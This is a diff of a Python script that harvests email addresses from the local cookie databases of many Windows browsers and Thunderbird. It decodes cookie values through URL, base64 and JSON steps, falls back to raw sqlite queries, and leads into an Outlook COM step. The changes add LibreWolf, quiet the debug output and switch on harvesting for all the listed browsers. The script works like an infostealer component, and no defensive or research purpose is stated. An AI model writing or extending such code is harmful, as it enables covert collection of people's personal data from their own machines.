@@ -38,6 +38,7 @@ brave_path = os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Bro
 operagx_path = os.path.join(os.getenv('APPDATA'), 'Opera Software')
 opera_path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable')
 firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
+librewolf_path = os.path.join(os.getenv('APPDATA'), 'librewolf', 'Profiles')
 thunderbird_path = os.path.join(os.getenv('APPDATA'), 'thunderbird', 'Profiles')
 opera_local_state_path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Local State')
 email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
@@ -427,12 +428,14 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                             chunks = decoded.split(delim)
                             for chunk in chunks:
                                 try:
+                                    if len(chunk) % 4 != 0: chunk += (4 - (len(chunk) % 4)) * '='
                                     chunk = urllib.parse.unquote(chunk)
                                     decoded_string, decoding = decode_with_fallback(base64.b64decode(chunk, validate=True))
-                                    print(f"used delimiter {delim} for chunk {chunk} : used {decoding} and value {decoded_string}")
+                                    decoded_string = urllib.parse.unquote(decoded_string)
+                                    # print(f"used delimiter {delim} for chunk {chunk} : used {decoding} and value {decoded_string}")
 
                                     if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
-                                        print(f"IS ACTUALLY A JSON FOR CHUNK {decoded_string}")
+                                        # print(f"IS ACTUALLY A JSON FOR CHUNK {decoded_string}")
                                         emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
 
                                     else: emails.extend(re.findall(email_pattern, decoded_string))
@@ -441,7 +444,8 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                     #base64 decoding
                     try:
                         decoded_string, decoding = decode_with_fallback(base64.b64decode(decoded, validate=True))
-                        print(f"decoded with -> {decoding} and value -> {decoded_string}")
+                        decoded_string = urllib.parse.unquote(decoded_string)
+                        # print(f"decoded with -> {decoding} and value -> {decoded_string}")
 
                         if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
                             emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
@@ -453,16 +457,16 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                     #json decoding
                     try:
                         if decoded.strip().startswith('{') or decoded.strip().startswith('['):
-                            print(f"IS JSON FOR {cookie.name} : {decoded}")
+                            # print(f"IS JSON FOR {cookie.name} : {decoded}")
                             emails.extend(find_emails_in_json(json.loads(decoded), email_pattern))
                             continue
                     except Exception as e:
                         print(f"ERROR in json DECODING : {e}")
 
                     emails.extend(re.findall(email_pattern, decoded))
-
+                
             except Exception as e:
-                print(f"GET EXCEPTION WHILE GETTING COOKIES FOR {browser_name} :: {e}")
+                print(f"GOT EXCEPTION WHILE GETTING COOKIES FOR {browser_name}:{profile} using Browser_Cookie3 :: {e}")
                 if isdecryptable:
                     conn = sqlite3.connect(tcDatPath)
                     cur = conn.cursor()
@@ -512,10 +516,9 @@ def firefox(firefox_path, email_pattern, browser_name):
             try:
                 if browser_name == FIREFOX_BROWSER: cookies = browser_cookie3.firefox(cookie_file=tck)
                 elif browser_name == LIBREWOLF_BROWSER: cookies = browser_cookie3.librewolf(cookie_file=tck)
-                print(browser_name, ck, tck)
                 for cookie in cookies:
                     decoded = cookie.value
-                    print(f"{cookie.name} ::: {decoded}", '\n')
+                    # print(f"{cookie.name} ::: {decoded}", '\n')
                     # url decoding
                     try:
                         decoded = urllib.parse.unquote(decoded)
@@ -549,19 +552,21 @@ def firefox(firefox_path, email_pattern, browser_name):
                                     if len(chunk) % 4 != 0: chunk += (4 - (len(chunk) % 4)) * '='
                                     chunk = urllib.parse.unquote(chunk)
                                     decoded_string, decoding = decode_with_fallback(base64.b64decode(chunk, validate=True))
-                                    print(f"used delimiter {delim} for chunk {chunk} : used {decoding} and value {decoded_string}")
+                                    decoded_string = urllib.parse.unquote(decoded_string)
+                                    #print(f"used delimiter {delim} for chunk {chunk} : used {decoding} and value {decoded_string}")
 
                                     if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
-                                        print(f"IS ACTUALLY A JSON FOR CHUNK {decoded_string}")
+                                        #print(f"IS ACTUALLY A JSON FOR CHUNK {decoded_string}")
                                         emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
 
                                     else: emails.extend(re.findall(email_pattern, decoded_string))
-                                except Exception as e: print(f"ERROR in decoding with bas64 or url for delim {delim}: {e} for chunk {chunk}") 
+                                except Exception as e: pass#print(f"ERROR in decoding with bas64 or url for delim {delim}: {e} for chunk {chunk}") 
 
                     #base64 decoding
                     try:
                         decoded_string, decoding = decode_with_fallback(base64.b64decode(decoded, validate=True))
-                        print(f"decoded with -> {decoding} and value -> {decoded_string}")
+                        decoded_string = urllib.parse.unquote(decoded_string)
+                        # print(f"decoded with -> {decoding} and value -> {decoded_string}")
 
                         if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
                             emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
@@ -573,16 +578,15 @@ def firefox(firefox_path, email_pattern, browser_name):
                     #json decoding
                     try:
                         if decoded.strip().startswith('{') or decoded.strip().startswith('['):
-                            print(f"IS JSON FOR {cookie.name} : {decoded}")
+                            # print(f"IS JSON FOR {cookie.name} : {decoded}")
                             emails.extend(find_emails_in_json(json.loads(decoded), email_pattern))
                             continue
                     except Exception as e:
                         print(f"ERROR in json DECODING : {e}")
 
                     emails.extend(re.findall(email_pattern, decoded))
-
             except Exception as e:
-                print(f"ERROR USING BROWSER_COOKIE3 : {e}\nUsing normal sqlite query instead.")
+                print(f"ERROR USING BROWSER_COOKIE3 for {browser_name}:{profile} -> {e}\nUsing normal sqlite query instead.")
                 conn = sqlite3.connect(tck)
                 cur = conn.cursor()
                 cur.execute("SELECT value FROM moz_cookies WHERE value LIKE '%@%'")
@@ -710,22 +714,24 @@ emails = []
 #                 emails.extend(re.findall(email_pattern, data))
 #         except: pass
 
-# if os.path.exists(chrome_path): chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
-# if os.path.exists(edge_path): edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
+if os.path.exists(chrome_path): chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
+if os.path.exists(edge_path): edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
 if os.path.exists(firefox_path): firefox_emails = firefox(firefox_path, email_pattern, FIREFOX_BROWSER)
-# if os.path.exists(thunderbird_path): thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
-# if os.path.exists(brave_path): brave_emails = chromEdgeOnly(brave_path, email_pattern, BRAVE_BROWSER)
-# if os.path.exists(operagx_path): gx_emails = chromEdgeOnly(operagx_path, email_pattern, OPERAGX, isoperagx=True)
-# if os.path.exists(opera_path) : opera_mails = chromEdgeOnly(opera_path, email_pattern, OPERA_BROWSER, isdecryptable=True)
+if os.path.exists(librewolf_path): librewolf_emails = firefox(librewolf_path, email_pattern, LIBREWOLF_BROWSER)
+if os.path.exists(thunderbird_path): thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
+if os.path.exists(brave_path): brave_emails = chromEdgeOnly(brave_path, email_pattern, BRAVE_BROWSER)
+if os.path.exists(operagx_path): gx_emails = chromEdgeOnly(operagx_path, email_pattern, OPERAGX, isoperagx=True)
+if os.path.exists(opera_path) : opera_mails = chromEdgeOnly(opera_path, email_pattern, OPERA_BROWSER, isdecryptable=True)
 
 # # emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
-# emails.extend(chrome_emails)
-# emails.extend(edge_emails)
+emails.extend(chrome_emails)
+emails.extend(edge_emails)
 emails.extend(firefox_emails)
-# emails.extend(thunderbird_emails)
-# emails.extend(brave_emails)
-# semails.extend(gx_emails)
-# semails.extend(opera_mails)
+emails.extend(librewolf_emails)
+emails.extend(thunderbird_emails)
+emails.extend(brave_emails)
+emails.extend(gx_emails)
+emails.extend(opera_mails)
 
 try:
     # Method 1: Outlook COM API
